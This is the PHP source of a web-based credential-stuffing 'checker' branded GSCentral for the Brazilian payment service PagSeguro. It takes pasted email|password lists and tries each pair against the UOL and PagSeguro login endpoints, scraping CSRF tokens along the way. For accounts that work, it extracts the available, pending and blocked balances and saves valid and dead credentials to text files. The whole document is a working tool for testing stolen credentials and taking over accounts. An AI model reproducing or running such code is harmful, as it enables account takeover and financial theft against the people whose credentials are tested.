<?php


$sock = '';

error_reporting(0);



function getStr($string, $start, $end) {

    $str = explode($start, $string);

    $str = explode($end, $str[1]);

    return $str[0];

}



class cURL {



    var $callback = false;



    function setCallback($func_name) {

        $this->callback = $func_name;

    }



    function doRequest($method, $url) {

        $ch = curl_init();

        global $email, $pwd,$token,$pag;

        if ($pag)
        {
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_NOBODY, false);
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/pagseguro.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/pagseguro.txt');
            curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
            curl_setopt($ch, CURLOPT_TIMEOUT, 200);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);

            if ($method == 'POST') {

                curl_setopt($ch, CURLOPT_POST, 1);

                curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=+REDIR%7Chttps%3A%2F%2Fpagseguro.uol.com.br%2Ftransaction%2Fsearch.jhtml&skin=&acsrfToken='.$token.'&user='.$email.'&pass='.$pwd.'');

            }
        }
        else
        {

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/acessocard.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/acessocard.txt');
        curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);

        if ($method == 'POST') {

            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'user='.$email.'&pass='.$pwd.'&skin=default&dest=&deviceId='.$token.'');

        }
    }
        $data = curl_exec($ch);

        curl_close($ch);

        if ($data) {

            if ($this->callback) {

                $callback = $this->callback;

                $this->callback = false;

                return call_user_func($callback, $data);

            } else {

                return $data;

            }

        } else {

            return curl_error($ch);

        }

    }



    function get($url) {

        return $this->doRequest('GET', $url, 'NULL');

    }



    function post($url) {

        return $this->doRequest('POST', $url);

    }



}



echo '<div id="page-content">






<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />





    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){

            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';

        }

        function pushWrongFormat(str){

            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';

        }

    </script>
	<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">

<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">

<link rel="icon" href="lojas/hulk.ico">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap.min3f0d.css?v2.2.0">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap-extend.min3f0d.css?v2.2.0">

<title>GSCentral - PAGSEGURO</title>

</head>


<body><Center>



<div class="main-content">
<center><img src="img/centralbg.jpg"></center><br>
<br>
<H1><center>PAGSEGURO</h1><h4>GSCentral</h4>
<a href="logado.php" class="btn btn-link" role="button"><- Voltar</a>
<form method="post">
<div align="center"><textarea name="mp" rows="15" style="width:60%">';

if (isset($_POST['btn-submit']))

    echo $_POST['mp'];

else

    echo 'sualista@gmail.com|gscheckers';

;

echo '</textarea><br />
<br>
<button type="button" class="btn btn-info">Separador:</button><br></div><input type="text" name="delim" value="';

if (isset($_POST['btn-submit']))

    echo $_POST['delim'];

else

    echo '|';

;

echo '" size="1" /><input type="hidden" name="mail" value="';

if (isset($_POST['btn-submit']))

    echo $_POST['mail'];

else

    echo 0;

;

echo '" size="1" /><input type="hidden" name="pwd" value="';

if (isset($_POST['btn-submit']))

    echo $_POST['pwd'];

else

    echo 1;

;

echo '" size="1" />&nbsp;

<input type="submit" class="btn btn-success" value="CHECAR" name="btn-submit">

</div>

</form>

';

set_time_limit(0);



function fetch_value($str, $find_start, $find_end) {

    $start = strpos($str, $find_start);

    if ($start === false) {

        return "";

    }

    $length = strlen($find_start);

    $end = strpos(substr($str, $start + $length), $find_end);

    return trim(substr($str, $start + $length, $end));

}



function fetch_value_notrim($str, $find_start, $find_end) {

    $start = strpos($str, $find_start);

    if ($start === false) {

        return "";

    }

    $length = strlen($find_start);

    $end = strpos(substr($str, $start + $length), $find_end);

    return substr($str, $start + $length, $end);

}



$dir = dirname(__FILE__);

$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';

if (!file_exists($config['cookie_file'])) {

    $fp = @fopen($config['cookie_file'], 'w');

    @fclose($fp);

}

$zzz = "";

$live = array();



function get($list) {

    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);

    return $socks[0];

}



function delete_cookies() {

    global $config;

    $fp = @fopen($config['cookie_file'], 'w');

    @fclose($fp);

}



function xflush() {

    static $output_handler = null;

    if ($output_handler === null) {

        $output_handler = @ini_get('output_handler');

    }



    if ($output_handler == 'ob_gzhandler') {

        return;

    }



    flush();

    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {

        @ob_flush();

    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {

        @ob_end_flush();

        @ob_start();

    }

}



function curl_grab_page($site, $proxy, $proxystatus) {

    $chss = curl_init();

    curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);

    if ($proxystatus == 'on') {

        curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);

        curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);

        curl_setopt($chss, CURLOPT_PROXY, $proxy);

    }

    curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");

    curl_setopt($chss, CURLOPT_URL, $site);

    return curl_exec($chss);

    curl_close($chss);

}



function display($str) {

    echo '<div>' . $str . '</div>';

    xflush();

}



//function pushSockDie($str) {

// echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';

//  xflush();

//}

function pushPaypalDie($str) {

    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';

    file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);

    xflush();

}



function pushPaypal($str) {

    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';

    file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);

    xflush();

}



function pushWrongFormat($str) {

    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';

    xflush();

}


if (isset($_POST['btn-submit'])) {
    $linhas = explode("\n", $_POST['mp']);

    $conta = count($linhas);
    echo '

                                <br/>
                                <center>
                                <p style="background: #54bd0e; padding: 6px 20px; width: 180px; font-size: 13px; border-radius: 15px; color: #F0F0F0;">Lista Carregada ('.$conta.') </p>
                                </center>
                                    <div class="panel panel-green">
</span>
                                   <div class="alert alert-success"><small>✔ Aprovadas</small></div>
								   									<i class="fa fa-spinner fa-spin" style="font-size:24px"></i> Em teste...
                                    <div class="panel-body">
<legend class="tvmit_live"><br/><div id="listPaypal"></div></legend>
</div>
</div>                              <div class="panel panel-danger">
                                    <div class="panel-heading"><small>✘ Reprovadas</small></div>
                                    <div class="panel-body">
<legend class="tvmit_die"><br/><div id="listPaypalDie"></div></legend>
</div>
</div>
                                    <div class="panel panel-orange">
                                    <i class="material-icons">warning</i><p><small>Invalidas</small></p>
                                    <div class="panel-body">
<legend class="tvmit_die"><br/><div id="listWrongFormat"></div></legend>
';

    xflush();

    $emails = explode("\n", trim($_POST['mp']));

    $eCount = count($emails);

    $failed = $live = $uncheck = array();

    $checked = 0;

    if (!count($emails)) {

      //  continue;

    }

    delete_cookies();

    //$sockClear = isSockClear();

    //if ($sockClear != 1) {

    //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');

    //continue;

    //}









    function mask($val, $mask)

    {

        $maskared = '';

        $k = 0;

        for($i = 0; $i<=strlen($mask)-1; $i++)

        {

            if($mask[$i] == '#')

            {

                if(isset($val[$k]))

                    $maskared .= $val[$k++];

            }

            else

            {

                if(isset($mask[$i]))

                    $maskared .= $mask[$i];

            }

        }

        return $maskared;

    }





    foreach ($emails AS $k => $line) {

        $info = explode($_POST['delim'], $line);

        $email = trim($info["{$_POST['mail']}"]);

        $pwd = trim($info["{$_POST['pwd']}"]);

        if (strlen($email) < 14 || strlen($pwd) < 2) {

            unset($emails[$k]);

            pushWrongFormat($email . ' | ' . $pwd);

            continue;

        }

        //if ($failed[$sock] > 4)

        //   continue;

        //DELETAR COOKIES

        if (file_exists(getcwd() . '/acessocard.txt')) {

            unlink(getcwd() . '/acessocard.txt');

        }

        //FIM COOKIES

        //CHAMADAS DE TOKEN E POST





        $c = new cURL();



        $d = $c->post("https://acesso.uol.com.br/login.html");

        $checked++;


        if (stristr($d,'limite') !== false) {


            $pag = true;
            $a1 = new cURL();
            $b1 = $a1->get("https://pagseguro.uol.com.br/login.jhtml");
            $token = getStr($b1,'type="hidden" name="acsrfToken" value="','"');
            $c1 = new cURL();
            $d1 = $c1->post("https://pagseguro.uol.com.br/login.jhtml");
            $token;


            $xyz = "<b style=\"color:green\">✔ </b>$email | $pwd  ";



            $live[] = $xyz;



            unset($emails[$k]);

         // echo  '<textarea rows="40 cols="50">
          //  '.$d1.'
        //     </textarea>';


            if (stripos($d1, "EXTRATO") !== false)
            {
                $saldo = getStr($d1,'id="accountBalance" class="positive">','</dd>'); // Saldo disponível
                $receber = getStr($d1,'id="accountEscrow" class="neutral">','</dd>'); // Receber
               $bloqueado = getStr($d1,'id="accountBlocked" class="neutral">','</dd>'); // VaLOR BLOCK
                // Alone
                $available = str_replace(' \r\n','',$saldo);
                $receive = str_replace('\n','',$receber);
                $blocked = str_replace('\r\n','',$bloqueado);
                $status = str_replace('\r\n','',$estado);
                $xyz = "<p><center><b style=\"color:green\">✔ </b>$email | $pwd | <b>Saldo Disponivel:</b> <b style=\"color:green\"> $available </b>| <b>Receber:</b> <b style=\"color:green\"> $receive </b> | <b >Bloqueado:</b> <b style=\"color:red\"> $blocked </b> <b style=\"color:green\">| #GSCheckers </b></p></center>";
                $live[] = $xyz;
                unset($emails[$k]);
                pushPaypal($xyz);
                $pag = FALSE;
            }
            else
            {
                pushPaypalDie("<b style=\"color:red\">✘ </b>$email|$pwd ");
                unset($emails[$k]);
                $pag = FALSE;
            }





        }



        else{







            pushPaypalDie("<b style=\"color:red\">✘ </b>$email | $pwd ");











            unset($emails[$k]);

        }

    }

}

?>